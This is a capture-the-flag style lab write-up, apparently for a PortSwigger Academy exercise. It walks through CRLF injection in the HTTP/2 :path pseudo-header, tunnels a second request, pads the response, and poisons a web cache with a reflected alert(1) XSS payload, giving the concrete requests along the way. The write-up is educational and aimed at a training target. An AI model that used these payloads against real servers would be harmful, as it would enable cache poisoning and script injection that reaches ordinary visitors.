# Web Cache Poisoning via HTTP/2 Request Tunnelling

## Lab Objective


Exploit HTTP/2 request tunnelling to poison the web cache with a reflected XSS payload so that when the victim 
visits the home page, their browser executes:



```javascript

alert(1)

```




## Vulnerability



The front-end server:



* Accepts HTTP/2 requests.

* Downgrades them to HTTP/1.1.

* Does not properly sanitize the HTTP/2 `:path` pseudo-header.

* Allows HTTP/1.1 request data to be injected through `:path`.



The back-end connection is not reused, so classic request smuggling is not possible. However, we can still **tunnel 
a second HTTP/1.1 request inside the first request**.



---



## 1. Confirm `:path` Injection



Send:



```http

GET / HTTP/2

```



Make sure Burp Inspector shows **HTTP/2**.



Modify `:path`:



```text

/?cachebuster=1 HTTP/1.1\r\n Foo: bar

```



A normal response confirms that arbitrary headers can be injected through `:path`.



---



## 2. Create the HTTP/1.1 Tunnel



Change the outer request method to:



```http

HEAD

```



Use:




```text

/?cachebuster=2 HTTP/1.1\r\n

Host: YOUR-LAB-ID.web-security-academy.net\r\n

\r\n

GET /post?postId=1 HTTP/1.1\r\n

Foo: bar

```



The important structure is:



```text


Outer HEAD request

        ↓

HTTP/1.1 request line injected through :path

        ↓

Host header

        ↓

blank line

        ↓

Tunneled GET request

```



If `postId=1` times out, try another valid `postId`. In this lab, `postId=2` worked.



A successful tunnel can produce a response containing something like:



```http

HTTP/2 200 OK



HTTP/1.1 200 OK

...

```



The appearance of the inner HTTP/1.1 response demonstrates that the request was successfully tunneled.



---



## 3. Poison the Cache



After confirming the tunnel works, reduce `:path` to only:



```text

/?cachebuster=3

```



Send it repeatedly.



Check:



```http

X-Cache: hit

```



A `hit` indicates that the response is being served from the cache.



---



## 4. Find an XSS Gadget



Request:



```http


GET /resources

```



The application redirects to:



```http

/resources/

```



The query string is reflected into the `Location` header without proper encoding.



Test:



```html

<script>alert(1)</script>

```



---



## 5. Tunnel the XSS Request


Use:



```text

/?cachebuster=3 HTTP/1.1\r\n

Host: YOUR-LAB-ID.web-security-academy.net\r\n

\r\n

GET /resources?<script>alert(1)</script> HTTP/1.1\r\n

Foo: bar

```



The tunneled response should contain:




```http

HTTP/1.1 302 Found

Location: /resources/?<script>alert(1)</script>

```



This confirms that the XSS payload is reflected.

---


## 6. Handle the `Content-Length` Problem



A normal home-page response had:



```http

Content-Length: 8807

```




The tunneled response can be shorter than this value, causing the connection to wait or timeout.



Add padding after the payload:




```html

<script>alert(1)</script>AAAAAA...

```




The padding makes the tunneled response sufficiently long.



In this lab, a very large amount of padding can trigger:


```json

{"error":"Request path too long"}

```



So the goal is **not simply to add as many `A`s as possible**. Use enough padding to make the tunneled response 
exceed the relevant length without exceeding the maximum request-path size.



A successful response looked like:




```http

HTTP/2 200 OK

Content-Length: 8807

X-Cache: miss


HTTP/1.1 302 Found

Location: /resources/?<script>alert(1)</script>AAAA...

```



---



## 7. Final Cache Poisoning




Once the malicious tunneled response is working:



* Remove the `?cachebuster=3` from the relevant `:path`.

* Keep the malicious tunnel and padding intact.

* Re-send the request periodically to keep the cache poisoned.


* The victim visits the home page every 15 seconds.


When the victim receives the poisoned cached response, the reflected payload executes:




```javascript
alert(1)


```



---



## Key Takeaways



### HTTP/2 → HTTP/1.1 Downgrade




The critical weakness was:



```text

HTTP/2 :path
      ↓

HTTP/1.1 request line

```



Because `:path` was not properly sanitized, CRLF characters could be used to inject HTTP/1.1 request data.





### Request Tunnelling



Unlike classic request smuggling, the back-end connection does **not** need to be reused.



We effectively create:



```text

HTTP/2 request

    │

    └── injected HTTP/1.1 request

             │

             └── GET /resources?...XSS...


```



### Cache Poisoning Chain




```text

HTTP/2 :path injection

        ↓

HTTP/1.1 request tunnelling

        ↓

Reflected XSS

        ↓


Response-length/padding issue


        ↓

Cache poisoning

        ↓

Victim receives poisoned response

        ↓


alert(1)

```



### Important Indicators




```text

X-Cache: miss


```


→ Response was generated rather than served from cache.



```text


X-Cache: hit
```




→ Cached response was served.



```http

HTTP/1.1 302 Found

Location: /resources/?<script>alert(1)</script>

```




→ The tunneled request successfully reached the gadget and reflected the XSS payload.

**Reference:** [PortSwigger — Web cache poisoning via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling?utm_source=chatgpt.com)
